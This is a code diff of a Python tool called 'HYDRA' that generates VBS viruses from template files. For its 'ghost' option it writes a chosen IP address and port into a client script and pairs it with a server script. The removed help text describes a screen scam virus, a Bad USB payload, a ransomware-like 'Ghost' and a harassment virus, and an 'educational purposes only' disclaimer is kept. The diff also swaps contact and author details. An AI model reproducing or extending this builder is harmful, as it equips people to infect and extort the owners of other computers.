@@ -69,25 +69,20 @@ def modify_code_and_save_as_vbs(file_path, ip_address, port):
     with open(file_path, 'r', encoding='utf-8') as file:
         code = file.read()
 
-    # استبدال النصوص في الكود المدخل
     modified_code = code.replace('massagetitle', ip_address).replace('massagecontent', str(port))
 
-    # تحديد مسار حفظ الملف المعدل بصيغة VBS
     vbs_file_path = os.path.join('output', 'FILES', os.path.basename(file_path).replace('.txt', '.vbs'))
     os.makedirs(os.path.dirname(vbs_file_path), exist_ok=True)
 
-    # حفظ الملف المعدل بصيغة VBS
     with open(vbs_file_path, 'w', encoding='utf-8') as file:
         file.write(modified_code)
 
     print(Fore.LIGHTGREEN_EX + f"File '{os.path.basename(file_path)}' has been modified and saved as '{os.path.basename(vbs_file_path)}' successfully.")
 
 def copy_and_save_as_vbs(file_path):
-    # تحديد مسار حفظ الملف كما هو بصيغة VBS
     vbs_file_path = os.path.join('output', 'FILES', os.path.basename(file_path).replace('.txt', '.vbs'))
     os.makedirs(os.path.dirname(vbs_file_path), exist_ok=True)
 
-    # نسخ محتوى الملف كما هو وحفظه بصيغة VBS
     shutil.copy(file_path, vbs_file_path)
     print(Fore.LIGHTGREEN_EX + f"File '{os.path.basename(file_path)}' has been copied and saved as '{os.path.basename(vbs_file_path)}' successfully.")
 
@@ -114,12 +109,10 @@ def main():
             print(Fore.YELLOW + "We prepare everything for you, relax...")
             time.sleep(5)
 
-            # مسار ملف الـ txt والـ vbs
             client_code_path = os.path.join('FILES', 'popup.txt')
             vbs_code_path = os.path.join('output', 'FILES', 'popup.vbs')
 
             try:
-                # نسخ محتويات ملف الـ txt وحفظه في ملف الـ vbs
                 shutil.copy(client_code_path, vbs_code_path)
                 print(Fore.GREEN + "TXT File has been copied and saved as VBS successfully.")
             except Exception as e:
@@ -140,11 +133,9 @@ def main():
             print(Fore.YELLOW + "We prepare everything for you, relax...")
             time.sleep(5)
 
-            # تعديل ملف ghost.txt وحفظه كملف VBS
             client_code_path = os.path.join('FILES', 'ghost.txt')
             modify_code_and_save_as_vbs(client_code_path, ip_address, port)
 
-            # حفظ ملف ghost_s.txt كما هو بصيغة VBS
             server_code_path = os.path.join('FILES', 'ghost_s.txt')
             copy_and_save_as_vbs(server_code_path)
 
@@ -164,12 +155,10 @@ def main():
             print(Fore.YELLOW + "We prepare everything for you, relax...")
             time.sleep(5)
 
-            # مسار ملف الـ txt والـ vbs
             client_code_path = os.path.join('FILES', 'Restro.txt')
             vbs_code_path = os.path.join('output', 'FILES', 'Restro.vbs')
 
             try:
-                # نسخ محتويات ملف الـ txt وحفظه في ملف الـ vbs
                 shutil.copy(client_code_path, vbs_code_path)
                 print(Fore.GREEN + "TXT File has been copied and saved as VBS successfully.")
             except Exception as e:
@@ -184,28 +173,16 @@ def main():
 ##############################################################################################################################################################################################################################################
 
 
-# الخيار رقم 6 - HELP
         elif choice == 'h':
             print(Fore.LIGHTBLUE_EX + "HELP:")
             print(Fore.LIGHTWHITE_EX + "-----")
-            print(Fore.LIGHTRED_EX + "This program is designed for educational purposes only. It provides a menu of different Viruses and tools that can be used for security testing and awareness.")
-            print(Fore.LIGHTRED_EX + "Each option corresponds to a different type of Viruses or tool.")
-            print()
-            print(Fore.LIGHTMAGENTA_EX + "Options:")
-            print(Fore.LIGHTYELLOW_EX + "1. Windows Screen Scam virus: Creates a virus that simulates a screen scam on a Windows system.")
-            print(Fore.LIGHTYELLOW_EX + "2. Bad USB: Generates a virus for a USB device that may act in a malicious way when connected to a computer.")
-            print(Fore.LIGHTYELLOW_EX + "3. Pop-Up: Creates a simple pop-up virus.")
-            print(Fore.LIGHTYELLOW_EX + "4. Ghost: Generates a virus that may act as ransomware.")
-            print(Fore.LIGHTYELLOW_EX + "5. Restro: Creates a virus that may cause harassment.")
-            print(Fore.LIGHTYELLOW_EX + "6. HELP: Displays this help message.")
-            print(Fore.LIGHTYELLOW_EX + "7. Contact US for a problem: Provides contact information for support.")
-            print(Fore.LIGHTYELLOW_EX + "0. EXIT: Exits the program.")
+            print(Fore.LIGHTRED_EX + "This program is designed for educational purposes only.")
             print()
             print(Fore.LIGHTMAGENTA_EX + "Instructions:")
             print(Fore.GREEN + "1. Select the desired option by entering the corresponding number.")
             print(Fore.LIGHTCYAN_EX + "2. Follow the prompts to provide necessary information for the virus.")
             print(Fore.LIGHTGREEN_EX + "3. Wait for the program to prepare the virus.")
-            print(Fore.CYAN + "4. The generated virus will be saved in the 'output' and 'dist' folder.")
+            print(Fore.CYAN + "4. The generated virus will be saved in the 'output' folder.")
             print(Fore.LIGHTRED_EX + "5. Use the generated viruses responsibly and only in controlled environments.")
             print(Fore.YELLOW + "6. The program will keep running until you choose to exit (option 0).")
             print()
@@ -213,7 +190,7 @@ def main():
 
         elif choice == 'c':
             print(Fore.MAGENTA + "-------------------------------------------------")
-            print(Fore.YELLOW + "Contact US for a problem at [nextwebae@gmail.com]")
+            print(Fore.YELLOW + "Contact US for a problem at [a125141contact@gmail.com]")
             print(Fore.MAGENTA + "-------------------------------------------------")
 
 
@@ -226,7 +203,7 @@ def main():
 
             
 
-    print(Fore.BLUE + "@",Fore.LIGHTWHITE_EX + "HYDRA will miss you :(",Fore.BLUE + "@" , Fore.LIGHTGREEN_EX + " HYDRA©" , Fore.LIGHTYELLOW_EX + "Created by ABooD125141"  )
+    print(Fore.BLUE + "@",Fore.LIGHTWHITE_EX + "HYDRA will miss you :(",Fore.BLUE + "@" , Fore.LIGHTGREEN_EX + " HYDRA©" , Fore.LIGHTYELLOW_EX + "Created by A125141"  )
     print(Fore.BLUE + "_________________________")
     print("                     ")
     print(Fore.YELLOW + "hAcK tHe WoRLd ")
